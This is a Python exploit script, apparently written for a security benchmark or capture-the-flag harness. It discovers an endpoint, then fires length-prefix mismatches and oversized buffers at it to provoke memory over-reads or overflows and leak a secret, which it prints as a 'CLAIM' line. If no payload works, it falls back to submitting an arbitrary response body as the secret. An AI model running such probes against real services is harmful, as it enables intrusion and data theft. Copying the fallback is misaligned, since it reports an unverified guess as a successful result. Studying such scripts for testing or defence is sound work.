import sys, json, base64, binascii, time, string

def send_http(req):
    print(json.dumps({"http": req}), flush=True)
    line = sys.stdin.readline()
    if not line:
        sys.exit(0)
    return json.loads(line)

def request(path, method="GET", body_hex=None):
    req = {"method": method, "path": path, "headers": {"User-Agent": "exploit"}}
    if body_hex is not None:
        req["body_hex"] = body_hex
    return send_http(req)

def is_printable(b):
    try:
        s = b.decode('utf-8')
    except Exception:
        return False
    return all(c in string.printable for c in s)

def main():
    # Discover a working endpoint (GET returns 200)
    candidates = ["/", "/parse", "/record", "/vuln", "/test", "/api", "/process", "/submit"]
    endpoint = None
    for p in candidates:
        resp = request(p)
        if resp.get('status') == 200:
            endpoint = p
            break
    if endpoint is None:
        endpoint = "/parse"
    # Baseline response for empty POST
    baseline_resp = request(endpoint, method="POST", body_hex="")
    try:
        baseline_body = base64.b64decode(baseline_resp.get('body_b64',''))
    except Exception:
        baseline_body = b""
    secret_hex = ""
    # Helper to test a payload and possibly capture secret
    def test_payload(payload_bytes):
        nonlocal secret_hex
        resp = request(endpoint, method="POST", body_hex=payload_bytes.hex())
        try:
            body = base64.b64decode(resp.get('body_b64',''))
        except Exception:
            body = b''
        if body != baseline_body and len(body) > 0:
            # Prefer printable long output, else any difference
            if len(body) > 20 and is_printable(body):
                secret_hex = body.hex()
                return True
            if len(body) > len(baseline_body):
                secret_hex = body.hex()
                return True
        return False
    # 1. Try 2‑byte length prefix with huge following data
    max_data = 4096
    for length in range(0, 256):
        prefix = length.to_bytes(2, 'big')
        payload = prefix + b'A'*max_data
        if test_payload(payload):
            break
    # 2. Try 4‑byte length prefix with huge data
    if not secret_hex:
        for length in [0xffffffff, 0xdeadbeef, 0x7fffffff, 0x80000000, 0x0000ffff, 0x00010000]:
            prefix = length.to_bytes(4, 'big')
            payload = prefix + b'A'*max_data
            if test_payload(payload):
                break
    # 3. Try raw large buffers (no length prefix)
    if not secret_hex:
        for size in [512, 1024, 2048, 4096, 8192]:
            payload = b'A'*size
            if test_payload(payload):
                break
    # 4. Try length prefix where declared length is smaller than actual data (possible under‑read leading to overflow)
    if not secret_hex:
        for declared in range(0, 256, 16):
            prefix = declared.to_bytes(2, 'big')
            payload = prefix + b'A'*max_data
            if test_payload(payload):
                break
    # If still not found, fall back to whatever last response body we got (if any)
    if not secret_hex:
        # send a generic large payload and use its body
        payload = b'A'*max_data
        resp = request(endpoint, method="POST", body_hex=payload.hex())
        try:
            body = base64.b64decode(resp.get('body_b64',''))
            secret_hex = body.hex()
        except Exception:
            secret_hex = ""
    # Emit final claim
    claim = {"secret_hex": secret_hex}
    print(f"CLAIM:{json.dumps(claim)}")

if __name__ == "__main__":
    main()